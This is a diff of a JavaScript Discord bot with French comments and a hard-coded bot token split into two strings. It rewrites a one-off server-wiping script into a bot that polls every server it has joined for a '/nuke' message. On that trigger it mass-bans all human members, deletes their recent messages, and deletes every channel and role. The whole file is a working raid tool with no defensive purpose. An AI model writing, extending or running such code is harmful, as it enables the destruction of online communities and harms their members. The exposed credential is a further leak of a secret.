@@ -1,29 +1,57 @@
-
 const part1 = "MTU2NjQ3NDIzNzc0MzczNDk0NQ.GkOjNe.";
 const part2 = "9WkxRc2uaempXmyLz_WAfIiSU_WjR14MVRMqE8";
 const botToken = part1 + part2;
-const guild = "1566222855522488401";
 
-async function fullNuke() {
-  console.log("démarrage du grand nettoyage...");
+// On écoute les messages
+async function listen() {
+  console.log("Bot en ligne, en attente de commande...");
+  let lastMsgId = null;
 
-  // 1. ban de tout le monde
-  console.log("--- BAN DES MEMBRES ---");
-  let after = "0";
-  let banCount = 0;
-  while (true) {
-    let res = await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000&after=${after}`, {
-      headers: { "Authorization": `Bot ${botToken}` }
-    });
-    let batch = await res.json();
-    
-    if (batch.message) { 
-      console.log("erreur ban :", batch.message); 
-      break; 
-    }
-    if (!batch.length) { break; }
-    
-    let banPromises = batch.map(m => {
+  setInterval(async () => {
+    try {
+      // on check les messages récents dans tous les salons où le bot est
+      let res = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
+        headers: { "Authorization": `Bot ${botToken}` }
+      });
+      let guilds = await res.json();
+      
+      for (let g of guilds) {
+        let chans = await (await fetch(`https://discord.com/api/v9/guilds/${g.id}/channels`, {
+          headers: { "Authorization": `Bot ${botToken}` }
+        })).json();
+        
+        for (let c of chans) {
+          if (c.type !== 0) continue; // seulement les salons textuels
+          
+          let msgs = await (await fetch(`https://discord.com/api/v9/channels/${c.id}/messages?limit=5`, {
+            headers: { "Authorization": `Bot ${botToken}` }
+          })).json();
+          
+          if (Array.isArray(msgs)) {
+            for (let m of msgs) {
+              if (m.content === "/nuke" && m.id !== lastMsgId) {
+                lastMsgId = m.id;
+                console.log("commande /nuke détectée sur le serveur :", g.id);
+                nuke(g.id);
+              }
+            }
+          }
+        }
+      }
+    } catch (e) {}
+  }, 5000); // vérifie toutes les 5 secondes
+}
+
+async function nuke(guild) {
+  console.log(`lancement du nuke sur : ${guild}`);
+  
+  // 1. ban
+  let members = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000`, {
+    headers: { "Authorization": `Bot ${botToken}` }
+  })).json();
+  
+  if (!members.message) {
+    let bans = members.map(m => {
       if (m.user.bot) return Promise.resolve();
       return fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
         method: "PUT",
@@ -31,17 +59,10 @@ async function fullNuke() {
         body: JSON.stringify({ delete_message_seconds: 604800 })
       }).catch(() => {});
     });
-    
-    await Promise.all(banPromises);
-    banCount += batch.length;
-    console.log(`membres traités : ${banCount}`);
-    
-    after = batch[batch.length - 1].user.id;
-    await new Promise(r => setTimeout(r, 500)); 
+    await Promise.all(bans);
   }
 
-  // 2. suppression des salons
-  console.log("--- SUPPRESSION DES SALONS ---");
+  // 2. salons
   let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
     headers: { "Authorization": `Bot ${botToken}` }
   })).json();
@@ -52,13 +73,11 @@ async function fullNuke() {
         method: "DELETE",
         headers: { "Authorization": `Bot ${botToken}` }
       }).catch(() => {});
-      console.log(`salon supprimé : ${c.name}`);
-      await new Promise(r => setTimeout(r, 150));
+      await new Promise(r => setTimeout(r, 100));
     }
   }
 
-  // 3. suppression des rôles
-  console.log("--- SUPPRESSION DES RÔLES ---");
+  // 3. rôles
   let roles = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/roles`, {
     headers: { "Authorization": `Bot ${botToken}` }
   })).json();
@@ -70,12 +89,11 @@ async function fullNuke() {
         method: "DELETE",
         headers: { "Authorization": `Bot ${botToken}` }
       }).catch(() => {});
-      console.log(`rôle supprimé : ${r.name}`);
-      await new Promise(r => setTimeout(r, 150));
+      await new Promise(r => setTimeout(r, 100));
     }
   }
-
-  console.log("fin du grand nettoyage.");
+  
+  console.log("nuke terminé.");
 }
 
-fullNuke();
+listen();
